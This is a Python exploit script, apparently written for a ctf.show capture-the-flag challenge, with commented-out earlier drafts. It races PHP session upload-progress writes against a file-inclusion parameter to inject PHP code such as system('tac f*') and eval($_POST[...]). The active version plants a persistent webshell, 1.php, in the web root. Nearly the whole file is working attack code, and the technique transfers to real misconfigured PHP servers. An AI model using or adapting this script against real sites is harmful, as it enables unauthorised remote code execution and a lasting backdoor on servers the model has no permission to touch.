import io
import requests
import threading

# session = requests.Session()
# sess = 'ruiwen'
# url1 = "http://d89f5046-01ff-4c25-b42d-9abfe6954c27.challenge.ctf.show/"
# url2 = "http://d89f5046-01ff-4c25-b42d-9abfe6954c27.challenge.ctf.show/?isVIP=1"
# data1 = {
#     'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac f*");?>'
# }
# data2 = {
#     'ctf':'/tmp/sess_ruiwen'
# }
# file = {
#     'upload': ('test.txt', io.BytesIO(b'a' * 1024 * 50))
# }
# cookies = {
#     'PHPSESSID': sess
# }


# def write():
#     while True:
#         r = session.post(url1, data=data1, files=file, cookies=cookies)
#         print(r.status_code)


# def read():
#     while True:
#         r = session.post(url2,data=data2,cookies=cookies)
#         if 'ctfshow' in r.text:
#             print(r.text)


# threads = [threading.Thread(target=write),
#            threading.Thread(target=read)]
# for t in threads:
#     t.start()
# sessid = 'ruiwen'
# data = {

# "ctf": "/tmp/sess_ruiwen",
# "cmd": 'system("cat flag.php");'
# }

# def write(session):
#     while event.isSet():
#         f = io.BytesIO(b'a' * 1024 * 50)
#         resp = session.post('http://d89f5046-01ff-4c25-b42d-9abfe6954c27.challenge.ctf.show/',
#                             data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'},
#                             files={'file': ('test.txt', f)}, cookies={'PHPSESSID': sessid})
#         print(resp.status_code)

# def read(session):
#     while event.isSet():
#         res = session.post(
#             'http://d89f5046-01ff-4c25-b42d-9abfe6954c27.challenge.ctf.show/?isVIP=1',
#             data=data
#         )
#         if 'flag{' in res.text:
#             print(res.text)
#             event.clear()
#         else:
#             print('[*]retrying...')
# if __name__ == "__main__":
#     event = threading.Event()
#     event.set()
#     with requests.session() as session:
#         for i in range(1, 5):
#             threading.Thread(target=write, args=(session,)).start()

#         for i in range(1, 5):
#             threading.Thread(target=read, args=(session,)).start()



# url = 'http://e9d63437-c98f-4e7c-9a91-380d666539cb.challenge.ctf.show'

# def write(session):
#     '''利用PHP_SESSION_UPLOAD_PROGRESS将木马写入session。在session.upload_progress.name='PHP_SESSION_UPLOAD_PROGRESS'的条件下上传文件就会把这次上传的信息存储在/tmp/sess_flag中'''
#     data = {
#         'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac f*");?>'
#     }
#     while True:
#         '''创建一个文件用来上传进行条件竞争'''
#         f = io.BytesIO(b'a' * 1024 * 10)
#         '''以session的方式post上传PHPSESSID和要执行的语句'''
#         response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dota.txt', f)})
# def read(session):
#     data = {
#         '''这里猜测session文件在tmp目录下'''
#         'ctf':'/tmp/sess_flag'
#     }
#     while True:
#         '''获取文件包含过后的返回数据'''
#         response = session.post(url+'?isVIP=1',data=data)
#         if 'ctfshow' in response.text:
#             print(response.text)
#             break
#         else:
#             print('retry')

# if __name__ == '__main__':
#     '''实例化下session'''
#     session = requests.session()
#     '''创建多个线程,一个thread对象代表一个线程'''
#     for i in range(30):
#         threading.Thread(target=write, args=(session,)).start()
#     for i in range(30):
#         threading.Thread(target=read, args=(session,)).start()

url = "http://e9d63437-c98f-4e7c-9a91-380d666539cb.challenge.ctf.show"
sessid = "ruiwen"

def write(session):
    filebytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        res = session.post(url,
            data={
                'PHP_SESSION_UPLOAD_PROGRESS': "<?php eval($_POST[1]);?>"
                },
            cookies={
                'PHPSESSID': sessid
                },
            files={
                'file': ('ruiwen.jpg', filebytes)
                }
            )

def read(session):
    while True:
        res = session.post(url+"?isVIP=1",
                           data={
                               "ctf":"/tmp/sess_"+sessid,
                               "1":"file_put_contents('/var/www/html/1.php' , '<?php eval($_POST[2]);?>');",

                           },
                           cookies={
                               "PHPSESSID":sessid
                           }
                           )
        res2 = session.get("http://d936c46b-b390-4afd-9664-6303cd8f9a2a.challenge.ctf.show:8080/1.php")
        if res2.status_code == 200:
            print("成功写入一句话！")
        else:
            print("Retry")



if __name__ == "__main__":
    evnet = threading.Event()
    with requests.session() as session:
        for i in range(5):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()
    evnet.set()